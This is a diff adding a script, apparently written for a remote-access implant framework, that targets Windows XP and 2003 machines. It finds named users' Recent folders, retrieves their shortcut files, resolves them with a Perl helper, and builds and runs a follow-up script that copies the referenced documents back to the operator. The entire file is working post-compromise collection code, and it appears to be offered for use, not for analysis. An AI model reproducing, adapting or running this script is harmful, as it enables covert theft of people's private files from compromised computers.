@@ -1,0 +1,201 @@
+# TO DO:
+# 1. insert check for duplicate files
+# 7. prompt for new file name if filename exists
+
+@include "_GetSystemPaths.epm";
+@include "_GenericFunctions.epm";
+@include "_FileExists.epm";
+@include "_GetDirectory.epm";
+@include "_VersionChecks.epm";
+@record on;
+@echo off;
+
+string $users;
+string $name;
+string $driveLetter;
+string $root;
+string $system;
+string $logsdir;
+string $Recent = "Recent";
+string $dS = "\\Documents and Settings";
+bool $FOUND = FALSE;
+bool $LINKFOUND = FALSE;
+bool $CREATED = FALSE;
+int $RESET = 0;
+int $MAXFILESIZE = 500000;
+
+
+#---------------
+#get ip address
+#--------------
+string $dir;
+_GetLpLogsDirectory($dir);
+string $ipAddress = Split("\\", "$dir");
+$ipAddress = $ipAddress[1];
+
+#----------------------
+#Print Usage statement
+#----------------------
+if ($argc < 2) {
+	echo "Usage: script shortcuts.eps <username> <username>\n";
+	echo "  Creates EP script \"recent.get.$ipAddress.eps\" ";
+	echo "  The script collects the files contained in a user's Recent Folder.";
+	echo "  For multiple users separate the name with a space";	
+	echo "  This script only works on Windows XP and Windows 2003 targets.";
+	return false;
+}
+
+#--------------------
+#check for OS version
+#--------------------
+ifnot (_IsTargetXp() || _IsTarget2003()) { 
+	echo "\n";
+	echo "!! This script is only valid for Windows XP and Windows 2003 targets !!";
+	return false;
+}
+
+#---------------------------
+#get the path to root drive
+#---------------------------
+_GetSystemPaths($root, $system);
+$root = Split("\\", "$root");
+$driveLetter = $root[0];
+
+#-------------------------------------------
+#put user names from commandline in an array
+#--------------------------------------------
+int $a = 0;
+int $b = 1;
+while($b < $argc) {
+	$users[$a] = $argv[$b];
+	$a++;
+	$b++; 
+}
+
+#-------------------------------------
+#Check for Documents and Settings path
+#-------------------------------------
+if (_FileExists ("Documents and Settings", $driveLetter)) {
+	
+	#----------------------------------------
+	#see if link files exists for valid users
+	#-----------------------------------------
+	
+	foreach $name ($users) {
+		echo "Locating the Recent Folder for $name ...";
+		if (_FileExists ("Recent", "$driveLetter\\Documents and Settings\\$name")) {
+			$FOUND = TRUE;
+			@echo off;
+			`dir *.lnk -path "$driveLetter\\Documents and Settings\\$name\\Recent" -max 0`;
+			string $links = GetCmdData("name");
+					
+			#----------------------------
+			#get link files from target
+			#----------------------------
+			_GetLpLogsDirectory($logsdir);
+			ifnot (`local dir $logsdir\\Get_Files\\*`) {
+				`local mkdir $logsdir\\Get_Files`;
+			}
+			ifnot (`local dir $logsdir\\Get_Files\\NOSEND\\*`) {
+				`local mkdir $logsdir\\Get_Files\\NOSEND`;
+			}
+			ifnot (`local dir $logsdir\\Get_Files\\NOSEND\\Recent\\*`) {
+				`local mkdir $logsdir\\Get_Files\\NOSEND\\Recent`;
+			}
+			
+			@echo on;
+			string $link;
+			foreach $link ($links) {
+				`get "$driveLetter\\Documents and Settings\\$name\\Recent\\$link"`;
+				# ------------------------- echo "Got file $driveLetter\\Documents and Settings\\$name\\Recent\\$link\n";
+				`local run -command "cmd /C move Get_Files\\*.lnk_* Get_Files\\NOSEND" -redirect`;
+			}
+		}
+		else {
+			@echo on;
+			echo "Cannot locate the Recent folder for $name.\n";
+			continue;
+		}	
+	}
+	
+}
+
+else {
+	echo "Cannot locate the Document and Settings Folder.  Aborting Script ...\n\n";
+	return false;
+
+}
+
+
+#--------------------------------
+#See if we found some links files
+#---------------------------------
+ifnot ($FOUND) {
+	echo "No Recent data could be found for the selected users!\n\n";
+	return true; 
+}
+
+#------------------------------------
+#Call shortcut.pl to create LINKS.txt
+#------------------------------------
+string $path = "$logsdir\\Get_Files\\NOSEND";
+@echo on;
+echo " ";
+string $ScriptsDir;
+_GetEPScriptsPath($ScriptsDir);
+`local run -command "perl $ScriptsDir\\shortcut.pl $path" -redirect`;
+
+#-------------------------------------------------
+#read the LINKS.txt file & create recent.getme.eps
+#-------------------------------------------------
+string $files;
+int $size;
+if (ReadFile("$logsdir\\LINKS.txt", $files)) {
+	
+	
+	string $writeLine;
+	string $file;
+	int $counter = 0;
+	
+	#------------------------------------------------------------------
+	#write lines to getme script, files > MAXFILESIZE not brought back
+	#------------------------------------------------------------------
+	foreach $file ($files) {
+		@echo off;
+		ifnot (`dir "$file"`) { 
+			echo "Bad Link File: $file\n"; 
+			continue; 
+		}
+		$LINKFOUND = TRUE;
+		$size = GetCmdData("size");
+		if ($size < $MAXFILESIZE) {
+			$counter++; 
+			$writeLine[0] = "`get \"$file\"`;";
+			if ($counter == 5) { $writeLine[1] = "pause;"; } 
+			WriteFile("$ScriptsDir\\recent.get.$ipAddress.eps", true, $writeLine);
+			$CREATED = TRUE;
+		}
+		else { 
+			echo "The file $file is $size bytes. ";
+			if (prompt "Would you like to get this file?" ) {
+				$writeLine[0] = "`get \"$file\"`;";
+				if ($counter == 5) { $writeLine[1] = "pause;"; } 
+				WriteFile("$ScriptsDir\\recent.get.$ipAddress.eps", true, $writeLine);
+				$CREATED = TRUE;
+			}
+		}
+	}
+
+	`local run -command "cmd /C del $logsdir\\LINKS.txt" -redirect`;
+	ifnot($LINKFOUND) { echo "!! No valid links were found on target !!"; return true;}
+	@echo on;
+	if (prompt "\nWould you like to execute recent.get.$ipAddress.eps now?") { 
+		if (`script recent.get.$ipAddress.eps`) { echo "\nThe script recent.get.$ipAddress.eps successfully executed!";}
+	}
+	else { echo "Type 'script recent.get.$ipAddress.eps' to manually execute the script"; }
+}
+
+
+
+
+
